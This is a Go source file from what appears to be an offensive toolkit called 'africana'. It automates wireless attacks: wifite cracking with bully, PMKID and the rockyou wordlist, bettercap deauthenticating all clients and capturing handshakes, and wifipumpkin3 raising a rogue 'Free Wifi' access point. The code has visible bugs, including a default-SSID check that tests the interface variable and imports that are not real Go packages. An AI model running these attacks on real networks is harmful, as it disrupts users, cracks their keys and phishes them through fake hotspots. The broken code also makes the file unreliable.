package wireless

import (
    "os"
    "fmt"
    "bufio"
    "strings"
    "bcolors"
    "subprocess"
)

var userInput, userIface, userSsid string

func AirGeddon() {
    subprocess.Popen(`airgeddon`)
}

func WifiPumpkin3() {
    filePath := "/root/.config/wifipumpkin3/"
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        subprocess.Popen(`wifipumpkin3; clear`)
    }
    subprocess.Popen(`wifipumpkin3`)
}

func WifiteAuto() {
    fmt.Println()
    subprocess.Popen(`ip address`)
    fmt.Print(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.RED + "Wireless card to use?" + bcolors.ENDC + ":" + bcolors.BLUE + "Deafult" + bcolors.ENDC + ":" + bcolors.YELLOW + "wlan0" + bcolors.GREEN + ")# " + bcolors.ENDC)
    reader := bufio.NewReader(os.Stdin)
    userIface, _ := reader.ReadString('\n')
    userIface = strings.TrimSpace(userIface)
    if userIface == "" {
        userIface = "wlan0"
    }
    subprocess.PopenTwo(`wifite -i %s --ignore-locks --keep-ivs -p 1337 -mac --random-mac -v -inf --bully --pmkid --dic /usr/share/wordlists/rockyou.txt --require-fakeauth --nodeauth --pmkid-timeout 120`, userIface)
}

func BettercapAuto() {
    fmt.Println()
    subprocess.Popen(`ip address`)
    fmt.Print(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.RED + "Wireless card to use?" + bcolors.ENDC + ":" + bcolors.BLUE + "Deafult" + bcolors.ENDC + ":" + bcolors.YELLOW + "wlan0" + bcolors.GREEN + ")# " + bcolors.ENDC)
    reader := bufio.NewReader(os.Stdin)
    userIface, _ := reader.ReadString('\n')
    userIface = strings.TrimSpace(userIface)
    if userIface == "" {
        userIface = "wlan0"
    }
    subprocess.PopenSix(`airmon-ng check kill; service NetworkManager restart; ip link set %s down; iw dev %s set type monitor; ip link set %s up; iw %s set txpower fixed 3737373737373; service NetworkManager start; sleep 3; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; wifi.recon on; wifi.show; set wifi.show.sort clients desc; set ticker.commands clear; wifi.show; wifi.assoc all; wifi.assoc all wifi.handshakes.file /usr/local/opt/handshakes; wifi.deauth all"`, userIface, userIface, userIface, userIface, userIface)
}

func WifiPumpkin3Auto() {
    fmt.Println()
    subprocess.Popen(`ip address`)
    fmt.Print(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.RED + "Wireless card to use?" + bcolors.ENDC + ":" + bcolors.BLUE + "Deafult" + bcolors.ENDC + ":" + bcolors.YELLOW + "wlan0" + bcolors.GREEN + ")# " + bcolors.ENDC)
    reader := bufio.NewReader(os.Stdin)
    userIface, _ := reader.ReadString('\n')
    userIface = strings.TrimSpace(userIface)
    if userIface == "" {
        userIface = "wlan0"
    }
    fmt.Print(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.RED + "Name to set your wifi?" + bcolors.ENDC + ":" + bcolors.BLUE + "Deafult" + bcolors.ENDC + ":" + bcolors.YELLOW + "(9G Free Wifi)" + bcolors.GREEN + "# " + bcolors.ENDC)
    userSsid, _ := reader.ReadString('\n')
    userSsid = strings.TrimSpace(userSsid)
    if userIface == "" {
        userIface = "9G Free Wifi"
    }
    subprocess.PopenThree(`wifipumpkin3 --xpulp "set interface %s; set ssid '%s'; set proxy noproxy; start"`, userIface, userSsid)
}
